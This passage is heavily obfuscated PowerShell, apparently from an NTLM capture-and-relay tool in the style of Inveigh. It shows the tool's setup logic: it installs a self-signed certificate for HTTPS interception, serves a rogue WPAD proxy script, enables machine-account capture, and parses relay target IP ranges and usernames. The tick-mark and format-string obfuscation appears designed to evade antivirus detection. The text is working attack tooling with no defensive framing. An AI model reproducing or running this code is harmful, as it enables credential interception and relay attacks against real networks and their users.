			    ${cERtIF`I`cA`Te_En`H`ANCed_Ke`Y_usAGe_oID}.("{1}{0}" -f 'd','ad').Invoke(${CErTiF`iCATe_seRve`R_`Au`T`H_O`id})
			    ${C`erti`FicatE_E`NHancEd_kEy`_usaG`e_eXT`En`SioN} = New-`OB`jEct -com ("{3}{8}{4}{7}{2}{1}{9}{5}{0}{6}" -f 'ancedK','xtens','nrollment.CX509E','X5','9','onEnh','eyUsage','E','0','i')
			    ${C`erTificAtE_`enH`ANc`ed_KE`Y`_`U`SAg`e_e`xt`E`NsiON}.("{1}{4}{2}{0}{3}"-f'nco','Initial','E','de','ize').Invoke(${cE`Rti`FICate_enHAN`cE`d_KEY_`USa`G`E_`Oid})
			    ${C`eRTIf`I`Cate} = NEW-O`Bj`E`ct -com ("{8}{4}{5}{9}{3}{1}{0}{10}{7}{6}{2}" -f'Re','ficate','ate','erti','lment.','CX','c','Certifi','X509Enrol','509C','quest')
			    ${cErTi`F`IC`Ate}.("{3}{4}{2}{0}{1}"-f 'eK','ey','t','In','itializeFromPriva').Invoke(2,${ceRT`iFICAtE_`kEY},"")
			    ${C`e`RtiF`ICatE}."S`Ubj`Ect" = ${C`ER`T`ifiCAte_dISt`ingUISHed_`Na`Me}
			    ${C`e`RTIFiC`ATE}."IsSU`er" = ${CE`RTifIcaTe_I`sSuer_`DIstiNGU`is`HE`d_n`AMe}
			    ${C`ert`I`FICaTe}."NoT`Be`FOre" = (geT`-`date).("{0}{1}"-f 'Ad','dDays').Invoke(-271)
			    ${ceRtIfi`Ca`Te}."NO`TaF`TER" = ${cerT`iFIc`A`Te}."N`otbE`FO`Re".("{0}{1}{2}" -f'Ad','dDa','ys').Invoke(824)
			    ${CerTiFIcAt`e_haS`h_`ALGo`RI`T`HM_O`id} = Ne`w-`ObJECt -ComObject ("{3}{1}{0}{2}{5}{4}" -f'r','9En','o','X50','bjectId','llment.CO')
			    ${cERt`IFiC`ATE`_HA`sH`_ALGO`RiTH`M_OId}.("{5}{1}{4}{0}{3}{6}{2}" -f 'mAl','ializ','Name','gor','eFro','Init','ithm').Invoke(1,0,0,("{2}{0}{1}" -f 'A25','6','SH'))
			    ${cER`T`iFiCAtE}."h`A`s`Halgo`RItHm" = ${C`ErTifiCAtE_ha`sh_AlgOr`Ith`m`_OiD}
                ${C`ERtifIC`ATE}."X`509eXTENS`IoNs".("{0}{1}" -f'A','dd').Invoke(${c`ertIFiCAT`E_Enh`An`c`ed`_`Key_Usa`G`E_e`XtensIon})
                ${ceRT`I`FICatE_BA`SiC_`coNsTRaINTS} = new`-OB`JECT -com ("{6}{2}{5}{3}{7}{0}{9}{4}{8}{1}"-f'Basi','ints','09En','.CX509','onstr','rollment','X5','Extension','a','cC')
			    ${cerT`ifiCaTe_bA`sic_`COnsTraI`N`TS}.("{2}{3}{0}{1}" -f 'li','zeEncode','In','itia').Invoke(("{0}{1}"-f 'tru','e'),1)
                ${c`eRtif`ic`Ate}."X509eXTensi`ONS".("{0}{1}"-f'A','dd').Invoke(${cER`TiFIc`Ate`_`BASIc`_ConS`TRaiN`TS})
                ${ceR`T`iF`iCATE}.("{2}{1}{0}"-f 'e','od','Enc').Invoke()
                ${C`E`RtIFIcA`T`e_ENRoll`MENT} = NEW`-OB`jEcT -com ("{3}{0}{4}{2}{5}{1}" -f '50','lment','CX509','X','9Enrollment.','Enrol')
			    ${ce`RTifica`Te_`enR`oLlme`Nt}.("{4}{3}{1}{6}{5}{0}{2}" -f'Requ','izeF','est','nitial','I','m','ro').Invoke(${C`E`RTIf`ICAte})
			    ${c`e`Rtif`icATE`_data} = ${cErt`iFic`ATe_`EN`RolL`MEnt}.("{0}{2}{1}{3}"-f'Crea','eq','teR','uest').Invoke(0)
                ${CE`Rt`IfIca`Te_ENROllME`Nt}.("{4}{3}{0}{1}{2}" -f'spo','ns','e','nstallRe','I').Invoke(2,${CErti`FIca`Te_D`AtA},0,"")
                ${in`Vei`gH}."cErt`IF`icATe" = (geT-CHI`l`DItem (("{1}{5}{0}{3}{4}{2}"-f 'ocalM','Ce','hinejUsMy','a','c','rt:jUsL'))."r`ePl`Ace"(([cHaR]106+[cHaR]85+[cHaR]115),[striNG][cHaR]92) | WHe`Re-`Ob`jeCt {${_}."ISSU`ER" -match ${inV`e`igH}."CertiF`ICa`Te_iS`S`UEr"})
                ${i`NveIgh}."ht`TPS" = ${t`RuE}
                ${In`VeIGh}."oU`TPut_QUE`Ue"."a`DD"(("{0}{4}{7}{2}{8}{6}{3}{5}{1}"-f '[+','ed','aptu','Enab','] HTTP','l','e/Relay = ','S C','r'))  > ${Nu`LL}
            }
            else
            {

                if(${htTPsF`ORc`Ec`eRTdEletE} -eq 'Y')
                {
                    ${i`NvEigH}."HTTpS_`FOR`cE_Ce`Rtif`i`c`AtE`_de`leTe" = ${T`RuE}
                }

                ${inV`EIgh}."HTT`P`S_Ex`iSt`In`g_cerTi`FicA`TE" = ${t`Rue}
                ${I`Nvei`Gh}."OUtpu`T_Q`U`eUe".("{1}{0}"-f 'd','Ad').Invoke(("{7}{2}{0}{10}{3}{6}{4}{13}{11}{9}{1}{5}{12}{8}" -f ' HTTPS','ng Cer','+]','e ',' ','tific','=','[','te','sti',' Captur',' Exi','a','Using'))  > ${nU`Ll}
            }

        }
        catch
        {
            ${Ht`Tps} = "N"
            ${i`NVEIGh}."H`TTps" = ${f`ALSe}
            ${Inve`I`gh}."Outp`UT_q`UEUe"."a`DD"(("{0}{11}{5}{7}{8}{6}{3}{10}{9}{2}{1}{4}"-f'[-] HT','e','ficat','led Du',' Error','Ca','isab','p','ture/Relay D',' Certi','e To','TPS '))  > ${Nu`ll}
        }

    }

}
else
{
    ${INV`EI`GH}."ouTpu`T_q`Ueue".("{0}{1}"-f'A','dd').Invoke(("{4}{2}{5}{6}{0}{1}{3}{7}{8}"-f '/','Relay ','] H','= D','[+','TTPS Capt','ure','isable','d'))  > ${nu`lL}
}

if(${h`TTP} -eq 'Y' -or ${H`Tt`Ps} -eq 'Y')
{

    if(${CH`AlL`ENGE})
    {
        ${I`N`VEiGH}."outPut`_Q`Ue`UE"."a`DD"(('[+'+'] '+'H'+'TTP '+'NTL'+'M '+'Chall'+'en'+'ge '+'= '+"$Challenge"))  > ${Nu`Ll}
    }

    if(${MAc`hi`NeaCCou`NtS} -eq 'N')
    {
        ${I`Nv`eIgH}."out`PuT`_Q`UEuE"."A`DD"(("{1}{5}{10}{8}{2}{9}{0}{4}{6}{7}{3}"-f'unt','[+','ine Acc','d',' Capt',']','ure = D','isable','h','o',' Mac')) > ${N`UlL}
        ${I`NV`eIgH}."m`AchINE_aCCO`Un`Ts" = ${FAl`sE}
    }
    else
    {
        ${in`Veigh}."machInE`_AC`cOU`NTS" = ${tR`UE}
    }

    ${iN`Ve`igH}."OUtp`U`T_Q`UEuE"."A`dD"(('[+]'+' '+'W'+'PAD '+'Authen'+'ticati'+'on '+'= '+"$WPADAuth")) > ${Nu`ll}

    if(${WpADa`U`Th} -eq ("{0}{1}" -f'N','TLM'))
    {
        ${W`pADa`UTHig`NORe} = (${w`paDAU`ThI`GNOrE} | wher`E`-OBjecT {${_} -and ${_}.("{1}{0}"-f'm','Tri').Invoke()})

        if(${WpA`dA`U`ThigNO`Re}."COu`NT" -gt 0)
        {
            ${IN`VE`igh}."o`UtP`UT_Que`Ue".("{1}{0}"-f 'd','Ad').Invoke(("{6}{7}{3}{1}{4}{0}{5}{8}{2}" -f' ','icatio','= ','D NTLM Authent','n Ignore','Li','[+] W','PA','st ') + (${W`P`A`daUThIg`NorE} -join ","))  > ${N`Ull}
        }

    }

}

if(${pRO`XY} -eq 'Y')
{

    if(${PrOXY_p`Or`T_C`h`eCk})
    {
        ${hT`TP} = "N"
        ${i`NVEI`gH}."oUtPut`_`qUe`Ue"."a`dd"(('[+]'+' '+'P'+'roxy '+'Ca'+'p'+'ture/Rel'+'ay '+'Dis'+'able'+'d '+'Due'+' '+'T'+'o '+'I'+'n '+'Us'+'e '+'Po'+'rt '+"$ProxyPort"))  > ${n`ULL}
    }
    else
    {
        ${IN`Ve`iGh}."oUTput`_`queue"."a`dd"(("{1}{0}{6}{2}{3}{5}{4}"-f 'Proxy ','[+] ','pt','ur',' = Enabled','e/Relay','Ca'))  > ${nU`Ll}
        ${I`NvEiGH}."O`U`TPuT_`QuEuE"."a`DD"(('['+'+] '+'Prox'+'y '+'P'+'ort '+'= '+"$ProxyPort")) > ${nU`ll}
        ${p`R`oX`YPortF`AiLOVeR} = ${P`RoxY`pOrt} + 1
        ${W`PADres`p`ONse} = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
        ${PRoX`Yi`gno`Re} = (${p`RoXYIG`NORE} | Wh`erE-Ob`Je`cT {${_} -and ${_}.("{1}{0}" -f 'im','Tr').Invoke()})

        if(${PR`Oxy`IGnOrE}."C`Ount" -gt 0)
        {
            ${i`Nv`eIgh}."OUtP`Ut`_QuE`UE".("{1}{0}"-f'dd','A').Invoke(("{6}{4}{5}{2}{1}{3}{0}" -f ' ','g','y I','nore List =',' Pro','x','[+]') + (${proX`y`ig`NorE} -join ","))  > ${nu`LL}
        }

    }

}

if(${Domai`NMAPPI`NG})
{
    ${iNve`IgH}."o`UTpUT_Q`UeUe".("{0}{1}" -f'Ad','d').Invoke(("{4}{3}{2}{0}{1}{6}{5}"-f' Do','main M',']','+','[',' ','apping =') + (${DoM`AI`N`ma`PPing} -join ","))  > ${nU`ll}
    ${inV`E`IGh}."n`e`TbiOs`_dO`mAIn" = ${DomAIN`MApP`InG}[0]
    ${INve`i`GH}."dns_D`O`mAiN" = ${dOMaiN`mA`p`P`inG}[1]
}

${I`N`VEIgh}."outp`UT`_`QueuE"."a`dD"(("{2}{0}{3}{1}"-f 'y A','ck = ','[+] Rela','tta') + (${a`TtaCK} -join ",")) > ${NU`LL}



function CoNvERt`-rANGEtO`I`plisT
{
    param(${ip},${cI`DR},${S`TaRt},${e`ND})

    function cONV`eRt-`I`P`TOint64
    { 
        param(${I`P}) 
        
        ${Octe`Ts} = ${iP}.("{1}{0}" -f'it','spl').Invoke(".")

        return [int64]([int64]${o`Ct`Ets}[0] * 16777216 + [int64]${Oc`Te`Ts}[1]*65536 + [int64]${o`C`TEtS}[2] * 256 + [int64]${OC`TE`TS}[3]) 
    } 
    
    function c`OnVerT-I`NT`6`4toiP
    { 
        param ([int64]${I`Nt}) 
        return (( (gE`T-vAr`I`Able  ("M"+"3q") ).VaLue::("{0}{1}{2}" -f'trunca','t','e').Invoke(${i`Nt}/16777216)).("{0}{1}" -f'tostri','ng').Invoke() + "." +(  $m3q::("{0}{1}{2}" -f'trun','ca','te').Invoke((${I`Nt}%16777216)/65536)).("{2}{1}{0}" -f 'ng','i','tostr').Invoke() + "." + ( (d`ir  ('Vari'+'ABLE:m'+'3Q') ).value::("{2}{0}{1}" -f'run','cate','t').Invoke((${I`Nt}%65536)/256)).("{2}{0}{1}" -f 'st','ring','to').Invoke() + "." +(  $M3Q::("{0}{1}" -f'tr','uncate').Invoke(${I`Nt}%256)).("{0}{1}{2}"-f 'to','strin','g').Invoke())
    }

    ${ta`RgE`T_`LIST} = nEw`-`OB`jECT ("{5}{4}{3}{1}{0}{8}{6}{2}{7}"-f 'ti','ollec','Arra','.C','ystem','S','s.','yList','on')
    
    if(${i`P})
    {
        ${I`P_a`d`DREsS} =  $kTb::("{0}{1}"-f 'Par','se').Invoke(${I`P})
    }

    if(${C`idR})
    {
        ${Ma`Sk_aDdr`e`Ss} =   $ktB::"PA`RSe"((co`Nv`eR`T-`iNT64TOiP -int (  (vARI`A`BLE  ('2K'+'ra')).VAlue::("{1}{0}"-f 'oInt64','T').Invoke(("1" * ${C`IdR} + "0" * (32 - ${c`IDR})),2))))
    }

    if(${i`p})
    {
        ${N`EtwOr`k_ADd`R`EsS} = NEw`-o`Bj`ECt ("{1}{3}{2}{0}{4}" -f'IP','Sys','m.Net.','te','Address') (${mASK_`A`dD`R`Ess}."AD`dRe`SS" -band ${Ip_ad`Dr`ESS}."AD`drE`SS")
    }

    if(${i`p})
    {
        ${BrOA`d`Cast_adD`R`Ess} = N`ew`-obJe`ct ("{0}{3}{4}{1}{2}{5}"-f 'Syste','d','dr','m.Net.IP','A','ess') ((  (  VA`Ri`AbLE  KTB).VaLUe::("{0}{1}" -f'p','arse').Invoke(("{1}{0}{2}{3}"-f '5','255.2','5.255.2','55'))."a`DdrEsS" -bxor ${Ma`SK_`AdDrE`sS}."A`DD`ReSS" -bor ${NEtwo`Rk_adD`RE`Ss}."a`dDR`ESS"))
    } 
    
    if(${IP})
    { 
        ${st`Ar`T_adDRe`ss} = convErT-`Ip`TOiNt`64 -ip ${N`etWoRK_AD`Dr`E`Ss}."I`PAdDre`SST`OstRInG"
        ${EnD`_`Addre`Ss} = C`OnvEr`T`-IpTOINt64 -ip ${br`OaDc`ASt_a`d`DReSS}."IpAddRES`sTOst`RI`Ng"
    }
    else
    { 
        ${ST`ART_ADDrE`SS} = c`onVER`T-ipt`oinT64 -ip ${s`T`Art} 
        ${E`Nd`_ADDRESs} = CONVEr`T`-iP`TOi`NT64 -ip ${e`ND} 
    } 
    
    for(${I} = ${s`Tart`_aD`Dr`ESS}; ${i} -le ${en`d`_A`DdRESs}; ${i}++) 
    { 
        ${i`p_A`dd`ReSs} = coNvE`RT-I`Nt`64tO`ip -int ${i}
        ${T`ArGET_LI`ST}.("{1}{0}"-f 'd','Ad').Invoke(${iP_AD`drE`sS}) > ${nU`Ll}
    }

    if(${N`ETwORk`_`Addr`ESs})
    {
        ${TA`Rget`_LIST}.("{1}{0}" -f 'emove','R').Invoke(${neTWor`K_`A`DdRe`ss}."i`PaDdreS`sTOS`T`RinG")
    }

    if(${BroaDC`As`T_`A`Dd`RESs})
    {
        ${ta`R`GET_L`isT}.("{1}{0}" -f 'ove','Rem').Invoke(${bRoad`ca`sT`_adD`RESs}."iP`ADDrE`Ssto`sTR`ing")
    }
    
    return ${tAr`Ge`T_`LiST}
}

function GeT-`TaRGE`TL`IST
{
    param(${T`A`RgEts})

    ${targe`T`_l`iST} = nEw-o`B`JecT ("{3}{1}{4}{0}{2}" -f 'ctions.ArrayLis','em','t','Syst','.Colle')

    for(${I}=0;${i} -lt ${T`Ar`GEts}."COU`NT";${i}++)
    {

        if(${TA`RGe`Ts}[${i}] -like "*-*")
        {
            ${TAr`GeT_aR`RaY} = ${TAR`GE`TS}[${I}].("{1}{0}" -f't','spli').Invoke("-")

            if(${t`ARget_aR`R`AY}[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            ${t`ArGeT_`ARRAY}[1] -notmatch "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {

                if(${t`Ar`get_A`Rray}."COU`NT" -ne 2 -or ${TARGET_`ArR`AY}[1] -notmatch "^[\d]+$" -or ${TaRGet_`ArR`AY}[1] -gt 254)
                {
                    wRi`Te-`Ou`TPuT "[!] Invalid target $($target[$i]) "
                    throw
                }
                else
                {
                    ${I`p_`NEtwOrk_b`EGiN} = ${T`A`RGet_`ARRaY}[0].("{2}{1}{0}" -f 'CharArray','o','T').Invoke()
                     ( g`Ci  ("var"+"ia"+"BLe:kjrlW") ).VALUE::("{1}{0}{2}"-f 'ver','Re','se').Invoke(${ip_NeT`w`o`R`K_beGIN})
                    ${ip_nEtw`o`R`K_begin} = -join(${IP_net`Wo`R`k_B`e`GIN})
                    ${iP_`NETWo`RK_BE`GIN} = ${ip_N`EtW`ork`_bEGIN}.("{0}{1}"-f'S','ubString').Invoke(${Ip_N`e`TwOr`K`_`BEGIn}.("{1}{0}" -f'exOf','Ind').Invoke("."))
                    ${i`p`_NEtWOrK_`Be`gin} = ${ip_`N`eTWo`Rk_`BEgin}.("{0}{1}{2}" -f 'T','oChar','Array').Invoke()
                     $kJRlw::("{1}{0}{2}" -f 'v','Re','erse').Invoke(${ip_Ne`TW`o`RK_B`eGIn})
                    ${I`P`_N`EtwoRk`_BE`gin} = -join(${iP`_nE`TWo`Rk_`BeGIn})
                    ${ip_r`AnGE_`eNd} = ${IP_nE`T`Wo`RK_`B`eGin} + ${TARg`E`T_ARrAy}[1]
                    ${T`A`RGETS}[${I}] = ${TARgE`T_`AR`R`Ay}[0] + "-" + ${i`P_rANge_E`ND}
                }

            }

        }

    }

    ForEach(${e`NTrY} in ${TAR`g`ETS})
    {
        ${ENTR`Y_SpL`it} = ${N`ULL}

        if(${enT`Ry}.("{0}{1}{2}"-f 'conta','in','s').Invoke("/"))
        {
            ${ENtry_`S`PlIt} = ${E`NT`RY}.("{1}{0}"-f 'lit','Sp').Invoke("/")
            ${I`p} = ${enTR`Y`_SpLIt}[0]
            ${Ci`Dr} = ${En`TR`y_SPlIT}[1]
            [Array]${Ta`RgET_`RAn`GE} = c`o`NV`e`RT-rA`NgeT`OIPLisT -IP ${Ip} -CIDR ${C`iDR}
            ${tARg`E`T`_List}.("{1}{0}"-f 'e','AddRang').Invoke(${TA`RGEt_`RAngE})
        }
        elseif(${e`NtrY}.("{0}{2}{1}"-f 'con','ains','t').Invoke("-"))
        {
            ${Ent`R`Y_Sp`LiT} = ${eNT`Ry}.("{0}{1}"-f 'Sp','lit').Invoke("-")

            if(${E`NtrY`_SpL`it}[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            ${ENTRy`_`s`pLiT}[1] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {
                ${S`Tart_aDdr`EsS} = ${eNTRY`_s`pLit}[0]
                ${eN`d_`A`DDRESs} = ${e`N`TrY`_SpLiT}[1]
                [Array]${ta`R`G`et_RaNge} = conVERt`-`Ran`geT`oIP`L`iST -Start ${sT`Art`_aDdREsS} -End ${end`_aDD`R`ess}
                ${Ta`Rg`eT_Li`St}.("{1}{0}{2}"-f 'ddRan','A','ge').Invoke(${TAr`GEt`_`R`ANge})
            }
            else
            {
                ${TaRg`et`_liSt}.("{0}{1}"-f'A','dd').Invoke(${EN`TrY}) > ${n`ULL}    
            }
            
        }
        else
        {
            ${taRGET`_L`IST}.("{1}{0}" -f'dd','A').Invoke(${E`NT`RY}) > ${n`Ull}
        }

    }

    return ${TargEt`_`lI`St}
}

if(${TAr`g`eT})
{

    if(${T`A`RgeT}."C`OuNT" -eq 1)
    {
        ${INV`ei`Gh}."OUTp`U`T_QUEUE"."A`dD"(("{1}{2}{4}{0}{3}{5}"-f 'a','[','+] Relay','rget ',' T','= ') + (${ta`RG`Et} -join ",")) > ${n`UlL}
    }
    elseif(${Tar`GeT}."c`oUNt" -gt 3)
    {
        ${I`Nv`eIgH}."O`U`Tput_qUEuE"."a`dD"(("{4}{1}{0}{5}{3}{2}" -f 'e','+] R','= ','ts ','[','lay Targe') + (${T`ARG`Et}[0..2] -join ",") + "...") > ${NU`lL}
    }
    else
    {
        ${Inv`EigH}."ouTpUt`_`queUE"."A`DD"(("{1}{3}{0}{2}"-f'R','[+','elay Targets = ','] ') + (${TArG`Et} -join ",")) > ${n`UlL}
    }

    ${INV`e`Igh}."OutPUt`_`QUeuE".("{0}{1}"-f 'Ad','d').Invoke(("{4}{1}{3}{2}{0}" -f ' List','*] Pars','g Relay Target','in','[')) > ${nu`lL}
    ${I`Nv`eIgh}."tarGE`T_`LiSt" = neW-O`Bje`ct ("{4}{0}{3}{2}{1}"-f'em.Co','rayList','ections.Ar','ll','Syst')
    [Array]${taRGE`T_rA`NGe} = Get-T`ArGE`TList ${Ta`R`get}
    ${inVei`gH}."TAr`get_`list".("{0}{1}{2}" -f'A','d','dRange').Invoke(${tA`RGEt`_ra`NgE})
}

if(${t`A`RgE`TExCL`UDe})
{

    if(${TaRg`eTE`x`CLUDe}."CoU`Nt" -eq 1)
    {
        ${INV`e`iGh}."OUTpUT_`qu`E`UE".("{0}{1}" -f 'Ad','d').Invoke(("{3}{1}{6}{4}{0}{5}{2}" -f ' ','+] Relay Ta',' ','[','lude','=','rget Exc') + (${taRG`Et`EX`CLu`dE} -join ",")) > ${n`Ull}
    }
    elseif(${targe`Te`xcLudE}."Co`UNt" -gt 3)
    {
        ${iNV`EI`gh}."Out`pUT_qUe`Ue".("{1}{0}" -f'dd','A').Invoke(("{4}{0}{1}{3}{2}" -f 'el','ay Targ','ts Exclude = ','e','[+] R') + (${TAr`G`etE`xcL`UdE}[0..2] -join ",") + "...") > ${n`ULL}
    }
    else
    {
        ${In`Ve`Igh}."O`UTPUT_que`Ue"."a`dd"(("{0}{8}{4}{5}{7}{3}{2}{1}{6}" -f'[+]','=','Exclude ',' ','lay Tar','g',' ','ets',' Re') + (${Ta`RGet`exCluDe} -join ",")) > ${n`UlL}
    }

    ${IN`Ve`igh}."Ou`TPUT`_QuEuE"."a`Dd"(("{0}{6}{9}{3}{8}{1}{4}{5}{7}{2}"-f'[*] Parsi','cl','st','y Target E','u','de L','ng ','i','x','Rela')) > ${nu`lL}
    ${I`NvE`igH}."T`ArGeT_eXc`LU`de_Li`sT" = n`eW-O`BjeCT ("{0}{6}{3}{2}{1}{4}{7}{5}" -f'Syst','r','ons.Ar','Collecti','ayL','t','em.','is')
    [Array]${t`ArgE`T_ra`Nge} = GEt-tAR`gE`TlI`sT ${TA`RGeTExC`LUDE}
    ${iN`VEigh}."TARGet`_ex`CL`Ude_`l`isT".("{0}{1}"-f 'AddR','ange').Invoke(${Tar`gETe`xc`l`UdE})
}

if(${u`S`ER`NAme})
{

    if(${uS`Er`N`AME}."C`ounT" -eq 1)
    {
        ${In`V`EIGH}."Ou`TPUT_QuE`UE"."a`dd"(("{4}{2}{1}{3}{0}"-f'= ',' Userna','ay','me ','[+] Rel') + (${USE`RN`AmE} -join ",")) > ${N`ULl}
    }
    else
    {
        ${I`NVEI`gh}."OutpU`T`_QUeUe".("{1}{0}" -f'd','Ad').Invoke(("{5}{0}{6}{3}{1}{4}{2}" -f 'e','y Username','= ','a','s ','[+] R','l') + (${U`Sern`Ame} -join ",")) > ${NU`Ll}
    }

}

if(${re`LAYAUt`o`dI`saBLE} -eq 'Y')
{
    ${INv`E`Igh}."OUtPU`T_qU`E`Ue"."a`Dd"(("{1}{3}{4}{2}{5}{0}"-f'= Enabled','[+]','to',' ','Relay Au',' Disable ')) > ${nU`Ll}
}
else
{
    ${In`VE`iGh}."ouT`pUt_qU`E`Ue".("{1}{0}" -f'dd','A').Invoke(("{6}{7}{1}{4}{2}{0}{3}{5}" -f'ble =','o ','a',' Dis','Dis','abled','[+]',' Relay Aut')) > ${NU`lL}
}

if(${RE`l`Ay`AutoEXit} -eq 'Y')
{
    ${I`NVEiGh}."Ou`T`pUT_qU`euE".("{1}{0}" -f'dd','A').Invoke(("{4}{7}{8}{3}{5}{0}{2}{1}{6}"-f'Exi',' = Enab','t',' ','[+]','Auto ','led',' ','Relay')) > ${N`UlL}
}
else
{
    ${INVE`I`gH}."oU`TpuT_`qU`euE"."A`DD"(("{1}{0}{5}{7}{3}{6}{2}{4}" -f '+]','[',' Di','t','sabled',' ','o Exit =','Relay Au')) > ${nu`lL}
}

if(${S`ervIcE})
{
    ${iNVei`gH}."oUt`p`UT_qUe`UE"."A`DD"(('['+'+] '+'Re'+'l'+'ay '+'Se'+'rvice '+'= '+"$Service")) > ${nU`lL}
}

if(${cONs`oLE`o`UTpUt} -ne 'N')
{
    
    if(${cO`NsOl`EOUTPUt} -eq 'Y')
    {
        ${I`NV`EIgh}."oU`TpUT_Q`UeUe".("{0}{1}" -f'A','dd').Invoke(("{3}{7}{2}{4}{0}{10}{5}{1}{8}{9}{11}{6}"-f 'me Co','u','al T','[+] R','i',' Outp','bled','e','t',' = En','nsole','a'))  > ${nU`ll}
    }
    else
    {
        ${IN`VEIgh}."OuTPut_`Q`UEuE"."a`DD"(('[+'+'] '+'Real'+' '+'T'+'ime '+'Console'+' '+'O'+'utpu'+'t '+'= '+"$ConsoleOutput"))  > ${N`Ull}
    }

    ${IN`VeI`gh}."cONs`OL`e`_o`UtPUT" = ${t`RUe}

    if(${CO`N`sOLEs`T`Atus} -eq 1)
    {
        ${I`N`Veigh}."oUTPU`T_`quEUE"."A`dD"(('[+]'+' '+'Con'+'sole'+' '+'S'+'tatu'+'s '+'= '+"$ConsoleStatus "+'Min'+'ute'))  > ${nU`Ll}
    }
    elseif(${cO`NsOLe`STa`TuS} -gt 1)
    {
        ${iNv`e`Igh}."OU`TPU`T_QUE`Ue"."A`dd"(('[+'+'] '+'C'+'on'+'sole '+'Stat'+'u'+'s '+'= '+"$ConsoleStatus "+'M'+'inut'+'es'))  > ${nu`LL}
    }

}
else
{

    if(${InVE`I`gH}."to`ol" -eq 1)
    {
        ${i`Nv`EiGH}."Out`P`Ut_qUEue".("{0}{1}" -f 'A','dd').Invoke(("{5}{11}{10}{6}{9}{7}{0}{3}{2}{8}{1}{4}" -f'E',' Selectio','oo','xternal T','n','[!] ','u','e To ','l','tput Disabled Du','onsole O','Real Time C')) > ${n`ULL}
    }
    else
    {
        ${I`Nv`EiGh}."oUtput`_qu`EUE".("{1}{0}" -f'd','Ad').Invoke(("{7}{0}{6}{2}{9}{4}{8}{1}{5}{3}"-f 'Real Time Co','sa','s','led','utput ','b','n','[+] ','= Di','ole O')) > ${NU`Ll}
    }

}

if(${C`oNSoLe`Un`IQuE} -eq 'Y')
{
    ${InvEi`gH}."cO`NSOLe_`UNi`que" = ${tR`UE}
}
else
{
    ${I`NVEI`gH}."consOl`E`_UnIq`Ue" = ${fAl`Se}
}

if(${f`I`LEOUTpUt} -eq 'Y')
{
    ${IN`VeI`Gh}."o`UtPUT_q`UEue".("{1}{0}"-f'd','Ad').Invoke(("{8}{0}{7}{5}{4}{9}{2}{1}{3}{6}" -f ']',' =','put',' Enable',' File Ou','al Time','d',' Re','[+','t')) > ${nu`Ll}
    ${InvE`IGh}."O`U`TpUt_qu`EUe"."a`dD"(('[+'+'] '+'Outpu'+'t '+'Dir'+'ector'+'y '+'= '+"$output_directory")) > ${N`UlL}
    ${I`Nv`EiGH}."F`iLE_o`UTpUt" = ${Tr`UE}
}
else
{
    ${iNv`ei`GH}."ou`TPUT`_QU`eue"."A`dD"(("{0}{2}{3}{5}{6}{4}{1}" -f'[+]','d',' ','R',' = Disable','eal Time File',' Output')) > ${nu`lL}
}

if(${fI`l`e`Unique} -eq 'Y')
{
    ${i`NVE`IGh}."fI`le`_UniQ`Ue" = ${T`RuE}
}
else
{
    ${i`N`VeIGh}."File`_`Un`iQUe" = ${F`A`LsE}
}

if(${L`OgOuT`PUt} -eq 'Y')
{
    ${inVe`igH}."L`Og_O`UTp`UT" = ${t`RUE}
}
else
{
    ${InV`ei`Gh}."LOG`_ou`TpUT" = ${fA`lsE}
}

if(${R`U`NtIME} -eq 1)
{
    ${i`N`VEIgh}."oU`TpU`T_queUe"."A`dd"(('[+'+'] '+'Run'+' '+'T'+'ime '+'= '+"$RunTime "+'Minu'+'te')) > ${NU`lL}
}
elseif(${RuNTi`mE} -gt 1)
{
    ${I`NVe`IGh}."O`UtPut_`qUeue"."A`dD"(('['+'+] '+'Run'+' '+'Tim'+'e '+'= '+"$RunTime "+'Mi'+'n'+'utes')) > ${N`UlL}
}

if(${SH`Owh`eLp} -eq 'Y')
{
    ${i`Nv`EIGh}."OUTput`_`qU`Eue".("{0}{1}"-f'A','dd').Invoke(("{6}{1}{4}{2}{0}{3}{5}" -f 'veigh to ','un','In','st',' Stop-','op','[!] R')) > ${n`ULl}
        
    if(${InvE`Igh}."CO`NsO`lE_OutPuT")
    {
        ${i`NVei`gh}."OUtput_`qu`Eue".("{1}{0}" -f'dd','A').Invoke(("{6}{2}{3}{8}{1}{0}{4}{7}{5}"-f'on',' c','any',' ','sole ','ut','[*] Press ','outp','key to stop')) > ${NU`ll}
    }

}

while(${InvE`igH}."out`P`UT`_QUeUE"."C`OUNt" -gt 0)
{

    switch -Wildcard (${I`NveIgH}."oU`TPuT_Q`U`eUE"[0])
    {

        {${_} -like "?`[`!`]*" -or ${_} -like "?`[-`]*"}
        {

            if(${I`NVe`iGh}."STa`TUS_O`U`TpuT" -and ${InV`ei`Gh}."Outp`Ut_sTrEaM_`On`lY")
            {
                Wri`TE-OUT`p`Ut(${iNvE`I`Gh}."OU`T`pUt_Q`UeUE"[0] + ${INV`e`igh}."NEWL`iNE")
            }
            elseif(${i`N`VEiGH}."sta`TU`s_ouTput")
            {
                w`R`iTE-WArNINg(${I`NvEi`gh}."oU`Tp`Ut_Q`UeUE"[0])
            }
            
            if(${In`VE`igh}."FI`lE`_oU`TPuT")
            {
                ${i`Nve`igh}."l`Og_fi`LE_qu`E`UE"."A`Dd"(${IN`V`eIgh}."O`UtPu`T_q`UeUE"[0]) > ${n`UlL}
            }

            if(${in`VEi`Gh}."Lo`g_Ou`TPut")
            {
                ${i`Nvei`gH}."L`Og"."a`Dd"(${I`NVE`iGH}."o`UtPUt_`QUEUe"[0]) > ${nu`LL}
            }

            ${in`VeiGH}."outp`UT_Q`UEuE".("{1}{2}{0}"-f 'eAt','Re','mov').Invoke(0)
        }

        ("{1}{2}{0}"-f 't','def','aul')
        {

            if(${I`NVeIgh}."StA`Tus_OUTp`Ut" -and ${I`N`VeIGh}."o`UtPut`_`StREAM_ONlY")
            {
